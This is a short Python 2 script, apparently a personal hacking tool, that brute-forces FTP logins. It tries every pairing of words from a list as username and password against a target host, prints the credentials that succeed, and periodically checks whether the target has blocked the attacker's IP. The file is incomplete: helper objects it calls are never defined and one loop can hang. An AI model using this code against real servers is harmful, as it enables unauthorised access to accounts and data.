# -*- coding: utf-8 -*-
"""
__author__ = 'Langziyanqin'
__QQ__ = '982722261'
              ┏┓      ┏┓
            ┏┛┻━━━┛┻┓
            ┃      ☃      ┃
            ┃  ┳┛  ┗┳  ┃
            ┃      ┻      ┃
            ┗━┓      ┏━┛
                ┃      ┗━━━┓
                ┃  神兽保佑    ┣┓
                ┃　永无BUG！   ┏┛
                ┗┓┓┏━┳┓┏┛
                  ┃┫┫  ┃┫┫
                  ┗┻┛  ┗┻┛
"""
import sys

reload(sys)
sys.setdefaultencoding('utf-8')
from ftplib import FTP
import socket

socket.setdefaulttimeout(5)  # 设置了全局默认超时时间


def ftp_open(host, user, passwd, port=21):  # 打开FTP
    try:
        ftp = FTP(host)
        ftp.connect(host, port)  # 连接 服务器名  端口号
        ftp.login(user, passwd)
        ftp.quit()  # ftpB.quit() #退出ftp服务器
        return 1
    except:
        return 0


def link_ftp(host):  # TXT导入数组    组合密码    遍历连接FTP
    ######  遍历数组组合出 密码
    try:
        I1 = 0  # 得到list的第一个元素
        while I1 < len(LS.list_2):
            # print "第几组密码：",I1
            if LS.list_2[I1] == '':
                continue  # 跳过
            if I1 == len(LS.list_2):
                break  # 退出循环
            I2 = 0  # 得到list的第一个元素
            p_p_p = 0  # 心跳包计数器
            while I2 < len(LS.list_2):
                if LS.list_2[I2] == '':
                    continue  # 跳过
                ###########################
                # 当做心跳包使用  如果检测不到了  还能连接就退出
                # 防止人家屏蔽IP   20次检测一次心跳
                try:
                    if p_p_p >= 20:
                        print "_-_",
                        ftpB = FTP()  # 初始化FTP类
                        ftpB.connect(host, 21)  # 连接 服务器名  端口号
                        ftpB.quit()  # 退出ftp服务器
                        p_p_p = 0
                    p_p_p = p_p_p + 1
                except:
                    print u"检测心跳包----心跳停止"
                    sql_sel()  # SQL查询
                    return 0
                ###########################
                # print u"IP:",host,u"用户名:",LS.list_2[I1],u"密码:",LS.list_2[I2]
                if ftp_open(host, LS.list_2[I1], LS.list_2[I2]):  # 打开FTP
                    # print u"连接成功"
                    print u"\nIP:", host, u"用户名:", LS.list_2[I1], u"密码:", LS.list_2[I2], u"连接成功"
                else:
                    print u".",
                I2 = I2 + 1  # 二层
            I1 = I1 + 1  # 一层
        sql_sel()  # SQL查询
    except:
        print u"遍历数组组合出 密码错误"
        sql_sel()